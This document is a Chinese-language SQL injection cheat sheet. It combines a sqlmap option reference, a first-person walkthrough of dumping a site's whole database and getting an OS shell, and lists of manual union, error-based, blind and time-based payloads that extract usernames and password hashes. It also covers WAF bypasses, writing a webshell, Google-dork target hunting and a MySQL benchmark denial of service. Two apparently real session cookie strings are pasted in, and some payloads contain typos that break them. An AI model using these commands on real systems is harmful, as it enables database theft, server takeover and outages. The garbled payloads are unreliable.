# SQL注入

```
- target 目标

  以下至少需要设置其中一个选项，设置目标URL。

  -d     DIRECT 直接连接到数据库。 -u   URL, –url=URL 目标URL。 -l     LIST 从Burp或WebScarab代理的日志中解析目标。 -r    REQUESTFILE 从一个文件中载入HTTP请求。 -g    GOOGLEDORK 处理Google dork的结果作为目标URL。 -c    CONFIGFILE 从INI配置文件中加载选项。

- Request 请求

  如何连接到目标url

  –data=DATA 通过POST发送的数据字符串

  –cookie=COOKIE  HTTP Cookie头

  –cookie-urlencode URL 编码生成的cookie注入

  –-drop-set-cookie 忽略响应的Set – Cookie头信息

  –-user-agent=AGENT 指定 HTTP User – Agent头

  –random-agent 使用随机选定的HTTP User – Agent头

  –referer=REFERER 指定 HTTP Referer头

  –headers=HEADERS 换行分开，加入其他的HTTP头

  –auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)

  –auth-cred=ACRED HTTP身份验证凭据（用户名:密码）

  –auth-cert=ACERT HTTP认证证书（key_file，cert_file）

  –proxy=PROXY 使用HTTP代理连接到目标URL

  –proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）

  –ignore-proxy 忽略系统默认的HTTP代理

  –delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒

  –timeout=TIMEOUT 等待连接超时的时间（默认为30秒）

  –retries=RETRIES  连接超时后重新连接的时间（默认3）

  –scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式

  –safe-url=SAFURL 在测试过程中经常访问的url地址

  –safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL

- Injection 注入

  指定测试参数

  -p TESTPARAMETER 可测试的参数（S）

  –dbms=DBMS 强制后端的DBMS为此值

  –os=OS 强制后端的DBMS操作系统为这个值

  –prefix=PREFIX 注入payload字符串前缀

  –suffix=SUFFIX 注入payload字符串后缀

  –tamper=TAMPER 使用给定的脚本（S）篡改注入数据

- optimization 优化

  优化sqlmap特性

  -o 开启所有优化开关

  –predict-output 预测常见的查询输出

  –keep-alive 使用持久的HTTP（S）连接

  –null-connection 从没有实际的HTTP响应体中检索页面长度

  –threads=THREADS 最大的HTTP（S）请求并发量（默认为1）

- Detection 监测

  这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

  –level=LEVEL 执行测试的等级（1-5，默认为1）

  –risk=RISK 执行测试的风险（0-3，默认为1）

  –string=STRING 查询时有效时在页面匹配字符串

  –regexp=REGEXP 查询时有效时在页面匹配正则表达式

  –text-only 仅基于在文本内容比较网页

- Techniques 技巧

  这些选项可用于调整具体的SQL注入测试。

  –technique=TECH SQL注入技术测试（默认BEUST）

  –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）

  –union-cols=UCOLS 定列范围用于测试UNION查询注入

  –union-char=UCHAR 用于暴力猜解列数的字符

- Enumeration 枚举

  用来列举数据库管理系统的信息、表中的结构和数据。此外，还可以运行自己的SQL语句。

  -b, –banner 检索数据库管理系统的标识 –current-user 检索数据库管理系统当前用户 –current-db 检索数据库管理系统当前数据库 –is-dba 检测DBMS当前用户是否DBA –users 枚举数据库管理系统用户 –passwords 枚举数据库管理系统用户密码哈希 –privileges 枚举数据库管理系统用户的权限 -–roles 枚举数据库管理系统用户的角色 -–dbs 枚举数据库管理系统中的数据库名称 -–tables 枚举的数据库中的表名称 -–columns 枚举DBMS数据库表列 -–dump 转储数据库中的表数据 -–dump-all 转储所有的数据库表中的数据 -–search 搜索列（S），表（S）和/或数据库名称（S） -D DB 指定进行枚举的数据库名 -T TBL 要指定操作的数据库表名称 -C COL 要进行枚举的数据库列 -U USER 用来进行枚举的数据库用户 –exclude-sysdbs 枚举表时排除系统数据库 –start=LIMITSTART 第一个查询输出进入检索 –stop=LIMITSTOP 最后查询的输出进入检索 –first=FIRSTCHAR 第一个查询输出字的字符检索 –last=LASTCHAR 最后查询的输出字字符检索 –sql-query=QUERY 要执行的SQL语句 –sql-shell 提示交互式SQL的shell

- Fingerprint 指纹

  f, –fingerprint 执行检查广泛的DBMS版本指纹

- Operating system access 操作系统访问

  这些选项可以用于访问后端数据库管理系统的底层操作系统。

  –os-cmd=OSCMD 执行操作系统命令 –os-shell 交互式的操作系统的shell –os-pwn 获取一个OOB shell，meterpreter或VNC –os-smbrelay 一键获取一个OOB shell，meterpreter或VNC –os-bof 存储过程缓冲区溢出利用 –priv-esc 数据库进程用户权限提升 –msf-path=MSFPATH Metasploit Framework本地的安装路径 –tmp-path=TMPPATH 远程临时文件目录的绝对路径

- Brute force（蛮力)

  这些选项可以被用来运行蛮力检查。

  –common-tables 检查存在共同表 –common-columns 检查存在共同列

- User-defined function injection（用户自定义函数注入）

  这些选项可以用来创建用户自定义函数。

  –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径

- General
  这些选项可以用来设置一些一般的工作参数。
  -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中 -s SESSIONFILE 保存和恢复检索会话文件的所有数据 –flush-session 刷新当前目标的会话文件 –fresh-queries 忽略在会话文件中存储的查询结果 –eta 显示每个输出的预计到达时间 –update 更新SqlMap –save file保存选项到INI配置文件 –batch 从不询问用户输入，使用所有默认配置。
- File system access（访问文件系统)
  这些选项可以被用来访问后端数据库管理系统的底层文件系统。
  –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
- Miscellaneous 杂项
  –beep 发现SQL注入时提醒 –check-payload IDS对注入payloads的检测测试 –cleanup SqlMap具体的UDF和表清理DBMS –forms 对目标URL的解析和测试形式 –gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果 –page-rank Google dork结果显示网页排名（PR） –parse-errors 从响应页面解析数据库管理系统的错误消息 –replicate 复制转储的数据到一个sqlite3数据库 –tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址 –wizard 给初级用户的简单向导界面
- window 注册表
  这些选项可以被用来访问数据库管理系统Windows注册表。
  –reg-read 读一个Windows注册表项值 –reg-add 写一个Windows注册表项值数据 –reg-del 删除Windows注册表键值 –reg-key=REGKEY Windows注册表键 –reg-value=REGVAL Windows注册表项值 –reg-data=REGDATA Windows注册表键值数据 –reg-type=REGTYPE Windows注册表项值类型
```

<pre><code><strong>.get型：sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” 
</strong>2.post型: sqlmap -u “http://xxx.xx.xxx/xx.xxx” –data=”xxxx=xxxx&#x26;xxxx=xxx”
3.cookie类注入: sqlmap -u “http://xxx.xx.xxx/xx.xxx?xx=xxx” –cookie=”xxx=xxx&#x26;xxx=xxx” –level=2

需要[数据库](http://www.jb51.net/database/)好：–dbs
得到数据库名称xxx，需要表： -D xxx –tables
得到表名xxxx，需要段：-D xxx -T xxxx –columns
得到段内有admin，password，需要值：-D xxx -T xxxx -C “admin,password” –dump
那么我们来理解一下，-D -T -C 是干吗的，当然就是知道其名称，指定使用其。
–dbs –tables –columns 是干吗的，当然就是不知道名称，列出来呗
–dump 那自然就是字面意思，类似于导出数据的行为
其实注入有了上面这几个命令，妥妥的够用了，不过还需要绕waf –tamper=”"
注入被识别出来是工具，断开咋办–user-agent=”"
再多牛逼的功能都是慢慢积累出来的，别想一口吃成胖子

好，跑数据库就是这么简单，于是呢来一个稍微有点干货的例子：
http://www.xxx.com/login.[asp](http://www.jb51.net/kf/web/asp/)有post注入，我想日了,但是我不想出去拷贝post数据，很麻烦，我想让sqlmap自动跑post注入
sqlmap -u “http://www.xxx.com/login.asp” –forms
很好，上面的命令成功的帮我跑了post注入，并且找到了post的注入点jjj=123
sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –dbs
于是我用上面的命令看看数据库
sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj –is-dba
顺便看看当前用户是不是dba
sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -a 
用了上面的命令 -a能得到什么呢：自己去看帮助吧。
帮你筛选了一下，-a下面的那些命令是用来看用户，看主机，看权限的。
后来呢，我发现权限还是挺高的，同时呢，我跑出来了数据库名称kkk
sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –tables
同时我找到了网站路径，然后我就又一次找到了sqlmap的牛逼的–os-xx系列命令，可以执行系统命令，同时还发现了牛逼的xpcmdshell –os-shell
以及很多牛逼的文件操作命令–file-xx 这些命令在需要用的时候使用就是了，会给你带来意想不到的惊喜
与此同时，我发现tables里面没有我想要的东西，我也找不到合适的内容，咋办呢，心一横，我决定把所有的数据库内容跑出来自己找，于是我这么做：
sqlmap -u “http://www.xxx.com/login.asp” –forms -p jjj -D kkk –dump-all
然后牛逼的sqlmap就开始跑啊跑，然后紧接着我的蛋就碎了，尼玛，sqlmap一会就问你一次要不要[破解](http://www.jb51.net/Article/jiami/)密码，要不要这个，要不要那个，我和我的小朋友们都想擦你妹夫，功夫不负有心人，我又看见了一个命令 –batch 可以自动选择sqlmap默认选项
于是，我可以和我的小朋友们玩耍去了，再也不用看着sqlmap拖库了。

总结下来，帮助文档还是很重要的，多看看，总会有些收获：
为了避免各位看英文看到吐，大概总结下：
Target: 字面意思，目标，那么就是确定目标的
Request: 字面意思，请求，就是定义请求内容的，比如post数据，http头，cookie注入，http头污染等等
Optimization：字面意思，调节性能，等等
Injection: 字面意思，注入的设置内容基本在这里，比如指定注入点，指定db，指定系统，等等
Detection:
基本就是用在确认注入范围，寻找注入点区域，这些
Technique:
基本用在确定注入手段，以及攻击方式
Fingerprint:
基本用在指纹识别，用的很少
Enumeration:
枚举信息，主要用在注入中，很重要，很常用
Brute force:
用来爆破，其实主要是枚举tables columns用的
User-defined function injection:
现在只有udf提权，以及指定一些自己定义的sqlmap脚本用，高端使用，求大牛指点
File system access
主要是文件读取，文件写入
Operating system access 
主要用在对系统操作，例如os-shell 以及 后续的连接metasploit 实现后[渗透](http://vip.jb51.net/Article/61.html)攻击
[windows](http://www.jb51.net/os/windows/) registry access
基本就是注册表操作了
General
字面意思，综合的内容，一些特殊的功能实现，我在这里找到了crawl batch这些非常好用的参数
Miscellaneous</code></pre>



#### 注入

\[16:58:44] \[INFO] testing 'Boolean-based blind - Parameter replace (original value)' \[16:58:44] \[INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' \[16:58:44] \[INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause' \[16:58:44] \[INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' \[16:58:44] \[INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' \[16:58:44] \[INFO] testing 'Generic inline queries' \[16:58:44] \[INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)' \[16:58:44] \[INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)' \[16:58:44] \[INFO] testing 'Oracle stacked queries (DBMS\_PIPE.RECEIVE\_MESSAGE - comment)' \[16:58:44] \[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' \[16:58:44] \[INFO] testing 'PostgreSQL > 8.1 AND time-based blind' \[16:58:44] \[INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)' \[16:58:44] \[INFO] testing 'Oracle AND time-based blind' \[16:58:44] \[INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'

\[16:58:42] \[INFO] testing 'Boolean-based blind - Parameter replace (original value)' \[16:58:42] \[INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' \[16:58:42] \[INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause' \[16:58:42] \[INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' \[16:58:42] \[INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)' \[16:58:42] \[INFO] testing 'Generic inline queries' \[16:58:42] \[INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)' \[16:58:42] \[INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)' \[16:58:42] \[INFO] testing 'Oracle stacked queries (DBMS\_PIPE.RECEIVE\_MESSAGE - comment)' \[16:58:42] \[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' \[16:58:42] \[INFO] testing 'PostgreSQL > 8.1 AND time-based blind' \[16:58:42] \[INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)' \[16:58:42] \[INFO] testing 'Oracle AND time-based blind' \[16:58:42] \[INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'

Microsoft SQL Server/Sybase time-based blind (IF)'

PostgreSQL > 8.1 stacked queries (comment)

```
Hm_lvt_b1d43477dad4478f5edbd9345e0f744d="1631930854,1633653959"; ASP.NET_SessionId=dx5sbjm0ppop1x1smsn3jw5f; ASP.NET_SessionId_NS_Sig=oenCV6mdzXYl-lDs; Hm_lpvt_b1d43477dad4478f5edbd9345e0f744d=1633676190; v10.46.236.4eq89=ip=1&time=637693073538084772&stime=637693073538084772
```

```
Hm_lvt_b1d43477dad4478f5edbd9345e0f744d="1631930854,1633653959"; ASP.NET_SessionId=dx5sbjm0ppop1x1smsn3jw5f; ASP.NET_SessionId_NS_Sig=oenCV6mdzXYl-lDs; Hm_lpvt_b1d43477dad4478f5edbd9345e0f744d=1633676190; v10.46.236.4eq89=ip=1&time=637693073538084772&stime=637693073538084772
```

#### 手工注入

```
Order by 1,2,3,     ----->猜字段

union select  1,2,database()  ---》 爆库名

union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database(); --》数据库名称

Union select 1,2,group_comcat(column_name) from table_schema.columns where table_name=表名;--》列名

id为正确值时 :
 
​extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) * --+*    爆表---〉


​?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+    爆列名----》

?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and column_name not in ('user_id','first_name','last_name','user','avatar','last_login','failed_login')))) --+

?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+

?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you'))))--+ 
```

一.联合注入 判断是否有注入点 ’ and 1=1–+ 猜列数 'order by 1–+ 一直猜到5报错，列数为4 猜库 'and 1=1改为and 1=2 'and 1=2 union select 1,2,3,4–+发现标题为2，内容为3，把2，3换成sql语句 'and 1=2 union select 1,user(),database(),4–+ ’ and 1=2 union select 1,database(),schema\_name,4 from information\_schema.schemata limit 0,1–+ ’ and 1=2 union select 1,database(),schema\_name,4 from information\_schema.schemata limit 1,1–+ ’ and 1=2 union select 1,database(),schema\_name,4 from information\_schema.schemata limit 2,1–+ ’ and 1=2 union select 1,database(),schema\_name,4 from information\_schema.schemata limit 3,1–+ ’ and 1=2 union select 1,database(),schema\_name,4 from information\_schema.schemata limit 4,1–+ 得到五个数据库，假设其中一个数据库为 admin 爆表 ’ and 1=2 union select 1,database(),table\_name,4 from information\_schema.tables where table\_schema=‘admin’ limit 0,1–+ ’ and 1=2 union select 1,database(),table\_name,4 from information\_schema.tables where table\_schema=‘admin’ limit 1,1–+ 猜表里面的列名 ’ and 1=2 union select 1,database(),column\_name,4 from information\_schema.columns where table\_name=‘member’ limit 0,1–+ ’ and 1=2 union select 1,database(),column\_name,4 from information\_schema.columns where table\_name=‘member’ limit 1,1–+ ’ and 1=2 union select 1,database(),column\_name,4 from information\_schema.columns where table\_name=‘member’ limit 2,1–+ ’ and 1=2 union select 1,database(),column\_name,4 from information\_schema.columns where table\_name=‘member’ limit 3,1–+ 假设得到到四个列名id，name，password，status 查询用户名和密码 ’ and 1=2 union select 1,name,password,4 from member limit 0,1–+ ’ and 1=2 union select 1,name,password,4 from member limit 1,1–+ 得到两组md5加密的密码 用md5解密即可

二.盲注 1.数据库长度： http://127.0.0.1/new\_list.php?id=1 and length(database())=10 --+ 不报错说明数据库长度为10。为了快捷定位可以用大于小于进行二分定位。 2.爆数据库名： http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),1,1))=115 --+ s http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),2,1))=116 --+ t http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),3,1))=111–+ o http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),4,1))=114–+ r http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),5,1))=109–+ m http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),6,1))=103–+ g http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),7,1))=114–+ r http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),8,1))=111–+ o http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),9,1))=117–+ u http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select database()),10,1))=112–+ p 数据库名：stormgroup

3.爆表名： http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 0,1),1,1))=109 --+ m

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 0,1),2,1))=101 --+ e

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 0,1),3,1))=109 --+ m

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 0,1),4,1))=98 --+ b

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 0,1),5,1))=101 --+ e

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 0,1),6,1))=114 --+ r

表一：member

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 1,1),1,1))=110 --+ n

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 1,1),2,1))=111 --+ o

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 1,1),3,1))=116 --+ t

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 1,1),4,1))=105 --+ i

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 1,1),5,1))=99 --+ c

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select table\_name from information\_schema.tables where table\_schema=‘stormgroup’ limit 1,1),6,1))=101 --+ e

表二：notice

3.爆字段： http://127.0.0.1/new\_list.php?id=1 and length((select column\_name from information\_schema.columns where table\_name=‘member’ and table\_schema=‘stormgroup’ limit 0,1))=4 --+ 长度为4

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select column\_name from information\_schema.columns where table\_name=‘member’ and table\_schema=‘stormgroup’ limit 0,1),1,1))=110 --+ n http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select column\_name from information\_schema.columns where table\_name=‘member’ and table\_schema=‘stormgroup’ limit 0,1),2,1))=97 --+ a http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select column\_name from information\_schema.columns where table\_name=‘member’ and table\_schema=‘stormgroup’ limit 0,1),2,1))=109 --+ m http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select dump from information\_schema.columns where table\_name=‘member’ and table\_schema=‘stormgroup’ limit 0,1),2,1))=101 --+ e 字段一：name

http://127.0.0.1/new\_list.php?id=1 and length((select column\_name from information\_schema.columns where table\_name=‘member’ and table\_schema=‘stormgroup’ limit 1,1))=8 --+

字段二：猜想为password 步骤同上 字段三 http://127.0.0.1/new\_list.php?id=1 and length((select column\_name from information\_schema.columns where table\_name=‘member’ and table\_schema=‘stormgroup’ limit 2,1))=6 --+ 长度为6 步骤同上，字段名为status 4.爆字段内容： 先爆status字段内容： http://127.0.0.1/new\_list.php?id=1 and length((select concat(status) from stormgroup.member limit 0,1))=1 --+ 长度为一 http://127.0.0.1/new\_list.php?id=1 andascii(substr((select concat(name) from stormgroup.member limit 0,1),1,1))=48 --+ 0 账户状态为0不可用

http://127.0.0.1/new\_list.php?id=1 and length((select concat(status) from stormgroup.member limit 1,1))=1 --+ 长度为一 http://127.0.0.1/new\_list.php?id=1 andascii(substr((select concat(name) from stormgroup.member limit 1,1),1,1))=49 --+ 1 账户状态为1可用

name字段 http://127.0.0.1/new\_list.php?id=1 and length((select concat(name) from stormgroup.member limit 1,1))=5 --+ 长度为5 http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select concat(name) from stormgroup.member limit 1,1),1,1))=109 --+ m

http://127.0.0.1/new\_list.php?id=1 and ascii(substr((select concat(name) from stormgroup.member limit 1,1),2,1))= 111–+ o

…猜想库名为mo…

password字段 http://127.0.0.1/new\_list.php?id=1 and length((select concat(password) from stormgroup.member limit 1,1))=32 --+ 长度为32。。。。晕，太多了，上sqlmap，拿32位md5值。或者自己写个脚本

延时注入 在MySql延时注入里用到函数为：(与盲注基本差不多) sleep()延长查询时间，延长秒 if(exp1,exp2,exp3)如果exp1为假，那么执行exp2，否则执行exp3 ascii()==ord()将字符传转化为ASCII码 substr()==mid()截取字符串 这里使用延时注入方法继续注入，这里测试数据库用户长度使用： and if(length(user()>1),1,sleep(5)) 测试数据库用户长度，测试时发现页面返回未出现延时，证明数据库用户长度大于1，然后不断缩短其范围。 接下去就可以根据常规盲注的方法进行注入了，就是把exp1表达式换成盲注的payload，思路就是这种，下面就不一一测试了，我在这里只是想介绍延时注入的本质，以及MySql延时注入手工注入的方法。 总结： 基于时间的盲注也叫做延时注入，其实说白了就是根据服务器返回时候延时来判断我们注入的查询语句是否执行正确。出发点就是回到基于布尔的SQL盲注，也就是构造查询语句来判断结果是否为真。 在注入时，当页面不会有任何提示，无法判断是否注入成功时使用延时注入。 使用IF（查询语句，1，sleep（5）），即如果查询语句为真，那么直接返回结果；如果查询语句为假，那么过5秒之后返回页面。 反之： 例如： if(ascii(subtring(“hello”,1,1))=104,sleep(5),1) 可以看到，取出"hello"里的第一个字符串，也就是"h",判断他的ascii码是否为104(“h"的ascii码为104),如果是则延时5秒，反之不延时。 同样，我们可以在substring函数里面写SQL语句，提取出我们所要查的表名、列名，再用延时猜解出来。 例如： if(ascii(substring((select distinct concat(table\_name) FROM information\_schema.tables where table\_schema=database() limit 0,1),1,1))=116,sleep(5),1); 同样的，我们可以嵌入SQL语句带入查询，配合以上函数即可猜出表名第一个字母的ascii码为117，即"u”。 猜解列名也是差不多的用法。 Waf绕过 ’ order by 4 \u0026\u0023\u0033\u0039\u003b\u0020\u006f\u0072\u0064\u0065\u0072\u0020\u0062\u0079\u0020\u0034

“and (length(database()))>0-- URL编码：%22and%20(length(database()))%3E0 +UnIon/\*\*/SeLecT 1,2,3 /!UnIon/SeLecT 1,2,3 id=181+(union)+(sel)+(ct)+1,2,3

.asp?id=1 and true# 对a进行Unicode编码 asp?id=1 %61nd true#

sqlmap的使用 sqlmap是sql注入最常用的工具之一，比起手工注入，使用sqlmap的速度往往会更快。但不是所有注入都可以用sqlmap，有时手工也非常的重要。 判断是否存在注入：sqlmap -u “http://127.0.0.1/new\_list.php?id=1” 爆数据库名： sqlmap -u “http://127.0.0.1/new\_list.php?id=1” --dbs 爆指定数据库名的表名： sqlmap -u “http://127.0.0.1/new\_list.php?id=1” -D “数据库名” --table 爆指l列名： sqlmap -u “http://127.0.0.1/new\_list.php?id=1” -D “数据库名” -T “表名” --columns 直接爆列名内容： sqlmap -u “http://127.0.0.1/new\_list.php?id=1” -D “数据库名” -T “表名” --columns --dump ————————————————1. MySQL数据库注入

* 检查注入点(主要看是否能返回消息)：`sqlmap.py -u url`
* 爆所有库：`sqlmap.py -u url -dbs`
* 爆当前库：`sqlmap.py -u url --current-db`

#### 2.Access数据库注入

* 判断是否是access数据库：`url and exists(select id from MSysAccessObjects)` **其他数据库判断语句：**

> **Access:** aNd aSc(cHr(97))=97 **Access:** and exists(select id from MSysAccessObjects) **SQL Server:** and exists(select id from sysobjects) **SQL Server:** and length(user)>0 **MySQL:** and length(user())>

* access数据库没有库的概念，直接爆表`sqlmap.py -u "url" --tables`
* 爆列，爆字段，可以在日志里找到

#### 3. 指定数据库，操作系统

* 检查是否是注入点
* 爆库：`sqlmap.py -u url --dbms mysql 5.0 --current-db`
* 爆表：`sqlmap.py -u url --dbms mysql 5.0 -D cms --tables`
* 爆列：`sqlmap.py -u url --dbms mysql 5.0 -D cms -T cms_user --columns`
* 爆字段：`sqlmap.py -u url --dbms mysql 5.0 -D cms -T cms_users -C password ,username --dump`

#### 4. 请求延时注入

* 测试注入点：`sqlmap.py -u url -p id`
* sqlmap注入方式technique`sqlmap.py -u url --technique T`

> B: 基于Boolean的盲注（Boolean based blind） Q: 内联查询（inlin queries） T: 基于时间的盲注（time based blind） U: 联合查询（union query based） E: 错误（error based） S: 栈查询（stack queries）

* 猜数据库`sqlmap.py -u url --technique T -time-sec 9 --current-db`
* 其他参数：`--delay`，`--safe-freq`

#### 5.常规伪静态注入

\*\*伪静态：\*\*主要是为了隐藏传递的参数名，伪静态只是一种URL重写的手段，既然能接受参数输入，所以并不能防止注入。目前来看，防止注入的最有效的方法就是使用LINQ。

* 加星花：`sqlmap.py -u "url*.html" --dbs`
* 利用sqlmap注入：`sqlmap.py -u "url*.html" --current-db --hex`
* 爆表：`sqlmap.py -u "url*.html" -D "cms" --tables –hex`

#### 6.cookie注入

* burpsuite获得cookie
* sqlmap的cookie注入攻击：`sqlmap.py -u url --cookie “uname=admin" --level 2`
* 爆库，爆表，爆列，爆字段

#### 7.POST登录框注入

* burpsuite抓包右键保存到\Python2\sqlmap中
* 测试能否注入`sqlmap.py -r 1.txt -p user`（-r：让sqlmap加载post请求，-p：指定注入用的参数）
* 爆库 `sqlmap.py -r 1.txt --current-db`

***

* 自动搜索表单：`sqlmap.py -u url --form`
* 指定一个参数：`sqlmap.py -u url --data "name=1&pass=1"`

#### 8.交互式写shell及命令执行

* 测试注入点：`sqlmap.py -u url -p id`
* 利用SQLmap写webshell:`sqlmap.py -u url --os-shell` 输入脚本语言，输入网站绝对路径

#### 9.绕过WAF防火墙

* 利用tamper脚本绕过过滤: `sqlmap.py -u url --dbs --batch --flush-session --tamper=equaltolike.py,space2comment.py,randomcase.py`

#### 10.sqlmap模板使用，编写

* 尝试注入 and 1=1被拦截
* 利用%0a尝试绕过，发现可以
* 编写tamper模板，利用sqlmap跑库(c:\python27\sqlmap\tamper)
* 利用sqlmap跑库`sqlmap.py -u "url" --dbs --batch --tamper=equaltolike.py, space2mssqlhash.py, randomcase.py, space2hassh.py, base64encode.py, charencode.py`

#### 11.利用sqlmap来google搜索

* 查找页面：`sqlmap.py -g inurl:php?id=`

#### 12.sqlmpa进行Mysql DOS攻击

* 获得shell：`sqlmap.py -u url --sql-shell`
* 进行攻击：`select benchmark(9999999999,0*70726f63409284209)`
